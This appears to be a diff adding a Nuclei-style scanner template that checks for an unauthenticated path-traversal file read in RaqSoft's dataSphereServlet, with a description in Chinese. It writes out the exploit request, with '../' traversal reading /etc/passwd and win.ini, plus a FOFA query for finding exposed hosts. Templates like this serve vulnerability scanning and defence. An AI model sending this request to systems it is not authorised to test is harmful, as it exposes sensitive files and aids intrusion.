@@ -1,0 +1,40 @@
+id: raqsoft-dataSphereServlet-lfi
+
+info:
+  name: RQsoft dataSphereServlet Arbitrary File Read
+  author: Co5mos
+  severity: critical
+  description: |
+    润乾报表 dataSphereServlet 接口存在任意文件读取漏洞，未经身份验证的攻击者可以通过该漏洞读取系统内部敏感文件，获取敏感信息。
+  metadata:
+    verified: true
+    fofa-query: 'body="/raqsoft"'
+  tags: rqsoft, file-read
+
+http:
+  - raw:
+      - |
+        POST /servlet/dataSphereServlet?action=11 HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        path=../../../../../../../../../../..{{file}}&content=&mode=
+    
+    payloads:
+      file:
+        - /windows/win.ini
+        - /etc/passwd
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "\\[(font|extension|file)s\\]"
+          - "root:.*:0:0:"
+        condition: or
+
+      - type: status
+        status:
+          - 200
